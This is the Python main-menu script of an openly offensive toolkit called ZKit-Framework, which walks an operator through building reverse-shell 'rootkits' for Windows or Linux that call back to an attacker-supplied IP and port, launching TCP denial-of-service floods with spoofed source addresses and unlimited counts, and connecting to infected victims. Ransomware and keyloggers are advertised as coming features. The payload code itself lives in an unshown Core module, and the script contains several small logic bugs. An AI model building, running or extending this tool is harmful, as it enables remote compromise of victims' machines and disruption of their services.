"ZKit-Framework Github : https://github.com/000Zer000/ZKit-Framework"
__author__ = "Zer0"
# Created A New Header
__github__ = "https://github.com/000Zer000/ZKit-Framework"
__version__ = "1.0.0 Re-Write"
__license__ = "Apache License 2.0"
__status__ = "Developing"
# Anti Importing this file
# run it instead of importing this file
if __name__ == "__main__":
    try:
        # Doing some imports
        from os import path
        from socket import gethostname
        from time import sleep as Sleep
        from colorama import init, Fore
        from Banners import Banners
        import Core.Core as Core
        import random
        import signal
        import sys
        from os import mkdir
    except ImportError as value:
        # Ops ! Sth is missing
        import sys

        print(
            "One Or Some On Requirments Not Found . Please Install Them And Try Again ."
            + "Python Threw  : "
            + str(value)
        )
        sys.exit(1)

    # Initallizing Needed Variables
    PATH = path.dirname(__file__)
    T_PATH = PATH + "/Builded/Rootkit/"
    D_PATH = PATH + "/Builded/Dos/"
    K_PATH = PATH + "/Builded/KeyLogger/"
    R_PATH = PATH + "/Builded/Ransomware/"
    try :
        mkdir(T_PATH)
        mkdir(K_PATH)
        mkdir(D_PATH)
        mkdir(R_PATH)
    except OSError:
        # Folders Already Exist
        pass
    red, blue, green, reset = (
        Fore.LIGHTRED_EX,
        Fore.LIGHTBLUE_EX,
        Fore.LIGHTGREEN_EX,
        Fore.RESET,
    )
    yellow, magenta = Fore.LIGHTYELLOW_EX, Fore.LIGHTMAGENTA_EX
    init(convert=True)
    # Printing A Banner More Comming Soon
    banner = Banners.Banner1
    color = random.choice([red, blue, green, yellow, magenta])
    print(color + banner + reset)
    Sleep(1)
    # Hard And Boring Code
    print(
        "\t \t \t \t \t    Hacking is" + red + " C " + green + "O " + blue + "L " +
        yellow + "O " + magenta + "R " + green +
        "F " + red + "U " + magenta + "L " + reset
    )
    #
    print(
        "Available Options Are :\n" "* = Not Supported right now\n" + red +
        "  {1} --> Create A RootKit\n" + green + "  {2} --> Create A Ransomware *\n" +
        blue + "  {3} --> Create A KeyLogger *\n" + yellow
        + "  {4} --> Run A Dos Attack\n" + magenta +
        "  {5} --> Connect To A Victim\n" + reset
        + red + "  {000}" + "--> Exit ZKit-Framework\n" + reset
        + "  {" + red + "9" + green + "9" + blue + "9" + reset + "}" + "--> See Future Plans"
    )
    while True:
        CHOICE = str(input("..> "))
        if CHOICE == "000" :
            break
        elif CHOICE == "999":
                print("Things Are going to happen is next version is : \n"
                "1. Ransomware for Windows/Linux\n (Windows Must Be COMPILED)\n"
                "2. Brute Force Attacks\n"
                "3. Available Raw Payload (Without Platform Speciefied Protections)\n"
                "And If time lets Android Payload (Yes You Read TRUE)\n"
                "For Future Version There Are More PLANS TOO\n"
                "You can always support this project in two ways\n"
                "1.Star and watch the project : You get notification for new versions\n"
                "2.Donate !!!!!! (And watch too)"
                "In both two ways you support this project but if you donate on top of README"
                " in A List That header is named : Donaters I show the name you want with a "
                "sentence(Please Use Good Language) See yourself on top!!!!!")

        # Start Of Rootkit Part
        elif CHOICE == "1":
            # Getting Connection Type TCP/UDP
            print(
                "A " + red + "RootKit" + reset + " ? For Now Only Reverse Shell Is Available . "
                + "\nType 'why' To See The Reason .\n" + "What is The Connection Type : \n"
                + red + "{1}--> TCP\n"
                + green + "{2}--> UDP\n"
                + blue + "{000}--> Back To Main Menu" + reset
            )
            CHOICE = str(input("..> "))
            if "1" in CHOICE:
                CHOICE = "TCP"
            elif "2" in CHOICE :
                CHOICE = "UDP"
            if CHOICE == "why":
                print(
                    "Because Its A Solo Work . Only Me Working On This Project. \n"
                    "Its A Bit Slower To Upgrade , Maintain Everything alone .It needs lots of energy .\n"
                    "You can help this project with donating small but effective for now only "
                    + red + "bitcoin" "," + green + "litecoin" "," + blue +
                    "etherum" + reset +
                    " is available but you can contact me and get other currencies address fast"
                )
            elif CHOICE == "000":
                pass

            elif CHOICE == "TCP" or CHOICE == "UDP":
                # Getting Some Required Information : Path Of Rootkit , Attacker_Ip : Ip or Domain to Send data to it
                # Attacker_Port : An open port on attacker machine
                print(
                    "Some Information Is Required . File : the file can be created too "
                    ", Platform , Attacker_Ip , Attacker_Port "
                )
                # Getting File Path
                print(
                    "[" + yellow + "*" + reset +
                    "] Whats The File Name The Path Will Be "
                    "{}YOUR_FILE_NAME : ".format(T_PATH),
                    end="",
                )
                path = str(input(""))
                path = T_PATH + path + ".pyw"

                print("[" + blue + "+" + reset +
                      "] Using {} As File Path".format(path))
                # Very important
                print(
                    "Whats Your Victim(s) Operating System(s)\n"
                    + red + "{1}--> Windows\n"
                    + green + "{2}--> Linux\n"
                    + blue + "{000}--> Back To Main Menu" + reset
                    
                )
                VICTIM_OS = str(input("..> "))

                if VICTIM_OS == "000":
                    pass
                # translating

                elif VICTIM_OS == "1" or VICTIM_OS == "2":
                    VICTIM_OS = VICTIM_OS.replace("1", "WINDOWS", -1)
                    VICTIM_OS = VICTIM_OS.replace("2", "LINUX", -1)
                    # Getting Attacker ip
                    try:
                        print(
                            "[" + yellow + "*" + reset + "] Whats You IP Address"
                            "Host Name Or Domain Name "
                            "Press Ctrl-Z Or On Nix-Based Ctrl-D "
                            "To Use Current Host Name : ",
                            end="",
                        )
                        ATTACKER_IP = str(input(""))
                    except EOFError:
                        ATTACKER_IP = gethostname()
                    # For confirmation
                    print(
                        "[" + blue + "+" + reset +
                        "] Using IP {} As Attacker_ip".format(ATTACKER_IP)
                    )
                    # Getting an open port on attacker port
                    try:
                        print(
                            "[" + yellow + "*" + reset +
                            "] Whats An Open Port In Your Machine "
                            "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use Default Port (1534) : ",
                            end="",
                        )
                        ATTACKER_PORT = int(input(""))
                    except EOFError:
                        ATTACKER_PORT = 1534
                    print(
                        "[" + blue + "+" + reset +
                        "] Using IP {} As Attacker_ip".format(ATTACKER_PORT)
                    )
                # Some funcs in Core and a path shortener instead of 'import Core.Linux.Rootkit.Reverse_shell_TCP.create'
                # using 'import Core.Core as Core
                # Core.FUNC_YOU_WANT
                    if VICTIM_OS == "WINDOWS":
                        # r_w_r means rootkit windows reverse_shell
                        Core.r_w_r_create(path, ATTACKER_IP,
                                          ATTACKER_PORT, CHOICE)
                        print("If you have seen any problem or "
                              "want a feature that is not here please open an issue and "
                              "tell me to make ZKit Stronger together")
                    elif VICTIM_OS == "LINUX":
                        # r_l_r means rootkit linux reverse_shell
                        Core.r_l_r_create(path, ATTACKER_IP,
                                          ATTACKER_PORT, CHOICE)
                        print("If you have seen any problem or "
                              "want a feature that is not here please open an issue and "
                              "tell me to make ZKit Stronger together")
                    else:
                        # Bad OS
                        print(
                            "[" + red + "-" + reset +
                            "] Invalid OS [-- {} --]".format(VICTIM_OS)
                        )
            else:
                print(
                    "[" + red + "-" + reset +
                    "] Invalid Input {" + "{}".format(CHOICE) + "}"
                )
        # End Of Rootkit Part

        # Need Some Time For Development
        elif CHOICE == ("2" or "3"):
            print("* Means need development . Need some time for it")
        # Start of Dos Part
        elif CHOICE == "4":
            print(
                "What is The Type For Now Only TCP Supported : \n"
                "* = Not Supported right now\n"
                + red + "{1}--> SS (Single Ip , Single Port)\n"
                + green + "{2}--> SM (Single Ip , Multiple Ports\n"
                + blue + "{3}--> MS (Multiple Ips , Single Ports*\n"
                + yellow + "{4}--> MM (Multiple Ips , Multiple Ports*\n"
                + magenta + "{000}--> Back To Main Menu" + reset
               
            )
            CHOICE = str(input("..> "))
            if CHOICE == "000":
                pass
            elif CHOICE == "1":
                print(
                    "Some Information Is Required Source_IP, Victim_IP, Source_Port, Victim_Port, Count, Message"
                )
                try:
                    print(
                        "[" + yellow + "*" + reset +
                        "] Whats The Ip Address You Want To Attack From "
                        "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Ip : ",
                        end="",
                    )
                    SOURCE_IP = str(input(""))
                except EOFError:
                    SOURCE_IP = Core.random_ip()
                print(
                    "[" + blue + "+" + reset +
                    "] Using IP {} As Source_ip".format(SOURCE_IP)
                )

                try:
                    print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack From "
                          "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Port : ", end="")
                    SOURCE_PORT = int(input(""))
                except EOFError:
                    from Core.Core import random_int

                    SOURCE_PORT = random_int(1100, 4000)
                    print(
                        "[" + blue + "+" + reset +
                        "] Using IP {} As Source_ip".format(SOURCE_PORT)
                    )
                except:
                    print("Oh God . Port is A Number Not A String")
                    break
                else:
                    print(
                        "[" + blue + "+" + reset +
                        "] Using IP {} As Source_ip".format(SOURCE_PORT)
                    )
                print("[" + yellow + "*" + reset + "] Whats The Host " +
                      "Name Domain Name Or IP You Want To Attack To : ", end="")
                VICTIM_IP = str(input(""))
                print(
                    "[" + blue + "+" + reset + "] Using IP {} As Victim_ip".format(VICTIM_IP))
                try:
                    print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack "
                          + "to : Press Ctrl-Z Or On Nix-Based Ctrl-D To Use 80 : ", end="")
                    VICTIM_PORT = int(input(""))
                except EOFError:
                    SOURCE_PORT = 80
                except:
                    print("Oh God . Port is A Number Not A String")
                    break

                try:
                    print("[" + yellow + "*" + reset +
                          "] How Much Requests Do You Want To Send (-1 For Infinite) : ", end="")
                    COUNT = int(input(""))
                except ValueError:
                    print("Count Is A Number")
                    break
                else:
                    if COUNT == -1:
                        print("[" + blue + "+" + reset +
                              "] Using Infinite As Count")
                try:
                    print("[" + yellow + "*" + reset +
                          "] A Message For Your Victim (Default : Fuck You) Ctrl + Z Or Ctrl + D To Use Default  : ", end="")
                    MESSAGE = str(input(""))
                except EOFError:
                    MESSAGE = "Fuck You"

                Core.dos_ss(
                    SOURCE_IP, VICTIM_IP, SOURCE_PORT, VICTIM_PORT, COUNT, MESSAGE
                )
                print("If you have seen any problem or "
                      "want a feature that is not here please open an issue and "
                      "tell me to make ZKit Stronger together")
            elif CHOICE == "2":
                print(
                    "Some Information Is Required Source_IP, Victim_IP, Source_Port, Victim_Ports, Count, Message"
                )
                try:
                    print(
                        "[" + yellow + "*" + reset +
                        "] Whats The Ip Address You Want To Attack From "
                        "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Ip : ",
                        end="",
                    )
                    SOURCE_IP = str(input(""))
                except EOFError:
                    SOURCE_IP = Core.random_ip()
                print(
                    "[" + blue + "+" + reset +
                    "] Using IP {} As Source_ip".format(SOURCE_IP)
                )

                try:
                    print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack From "
                          "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Port : ", end="")
                    SOURCE_PORT = int(input(""))
                except EOFError:
                    from Core.Core import random_int

                    SOURCE_PORT = random_int(1100, 4000)
                    print(
                        "[" + blue + "+" + reset +
                        "] Using IP {} As Source_ip".format(SOURCE_PORT)
                    )
                except:
                    print("Oh God . Port is A Number Not A String")
                    break
                else:
                    print(
                        "[" + blue + "+" + reset +
                        "] Using IP {} As Source_ip".format(SOURCE_PORT)
                    )
                print("[" + yellow + "*" + reset + "] Whats The Host " +
                      "Name Domain Name Or IP You Want To Attack To : ", end="")
                VICTIM_IP = str(input(""))
                print(
                    "[" + blue + "+" + reset + "] Using IP {} As Victim_ip".format(VICTIM_IP))
                try:
                    print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack "
                          + "to : Press Ctrl-Z Or On Nix-Based Ctrl-D To Use 80 And 443 : ", end="")
                    VICTIM_PORTS = str(input(""))
                    VICTIM_PORTS = VICTIM_PORTS.split()
                except EOFError:
                    SOURCE_PORT = [80, 443]

                try:
                    print("[" + yellow + "*" + reset +
                          "] How Much Requests Do You Want To Send (-1 For Infinite) : ", end="")
                    COUNT = int(input(""))
                except ValueError:
                    print("Count Is A Number")
                    break
                else:
                    if COUNT == -1:
                        print("[" + blue + "+" + reset +
                              "] Using Infinite As Count")
                try:
                    print("[" + yellow + "*" + reset +
                          "] A Message For Your Victim (Default : Fuck You) Ctrl + Z Or Ctrl + D To Use Default  : ", end="")
                    MESSAGE = str(input(""))
                except EOFError:
                    MESSAGE = "Fuck You"

                Core.dos_sm(
                    SOURCE_IP, VICTIM_IP, SOURCE_PORT, VICTIM_PORTS, COUNT, MESSAGE
                )
                print("If you have seen any problem or "
                      "want a feature that is not here please open an issue and "
                      "tell me to make ZKit Stronger together")
        # End of Dos part
        elif CHOICE == "5":
            print("What Is The Victims PayLoad ?\n"
                  + red + "{1}--> Rootkit\n"
                  + green + "{2}--> KeyLogger*\n"
                  + blue + "{000}--> Back To Main Menu\n" + reset)
            CHOICE = str(input("..> "))
            if CHOICE == "000":
                pass
            elif CHOICE == "1" :
                print("At The Time Of Creation Of Rootkit . ZKit Asked About A Connection Type "
                "What Was It ?\n"
                + red + "{1}--> TCP\n"
                + green + "{2}--> UDP\n"
                + blue + "{000}--> Back To Main Menu" + reset
                )
                CHOICE = str(input("..>"))
                if  CHOICE == "000" :
                    pass
                elif  CHOICE == "1" :
                    from Core.Core import rootkit_connect
                    rootkit_connect("TCP")
                    print("If you have seen any problem or "
                          "want a feature that is not here please open an issue and "
                          "tell me to make ZKit Stronger together")
                elif  CHOICE == "1" :
                    from Core.Core import rootkit_connect
                    rootkit_connect("UDP")
                    print("If you have seen any problem or "
                          "want a feature that is not here please open an issue and "
                          "tell me to make ZKit Stronger together")
                else :
                    print("[" + red + "-" + reset +
                          "] Invalid Input {" + "{}".format(CHOICE) + "}"
                )
        else:
            # Bad input
            print("[" + red + "-" + reset +
                  "] Invalid Input {" + "{}".format(CHOICE) + "}"
            )
